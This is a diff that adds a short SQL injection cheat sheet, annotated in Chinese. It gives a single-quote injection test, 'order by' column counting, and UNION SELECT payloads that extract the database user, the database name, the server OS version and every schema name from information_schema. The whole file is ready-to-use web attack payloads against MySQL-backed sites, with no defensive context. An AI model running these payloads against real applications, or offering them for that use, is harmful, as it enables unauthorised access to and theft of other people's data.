@@ -1,0 +1,14 @@
+是否有注入
+1'
+
+猜信息列数
+order by 1
+
+连接数据库用户以及数据库名称
+and 1=2 union select user(),database()
+
+得到数据库用户和数据库名称
+and 1=2 union select 1,@@global.version_compile_os from mysql.user
+
+查询所有数据库名称
+and 1=2 union select 1,schema_name from information_schema.schemata
